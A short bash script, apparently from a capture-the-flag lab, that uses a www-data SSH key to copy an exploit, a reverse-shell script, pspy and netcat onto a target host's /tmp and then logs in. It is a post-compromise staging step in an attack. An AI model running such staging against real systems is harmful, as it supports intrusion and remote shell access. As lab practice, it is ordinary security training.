#!/bin/bash
scp -i credentials/id_rsa.www-data -P 2222 www/exploit.py www-data@10.10.10.246:/tmp
scp -i credentials/id_rsa.www-data -P 2222 www/rshell.py www-data@10.10.10.246:/tmp
scp -i credentials/id_rsa.www-data -P 2222 www/pspy www-data@10.10.10.246:/tmp
scp -i credentials/id_rsa.www-data -P 2222 www/nc www-data@10.10.10.246:/tmp

ssh -i credentials/id_rsa.www-data -p 2222 www-data@10.10.10.246
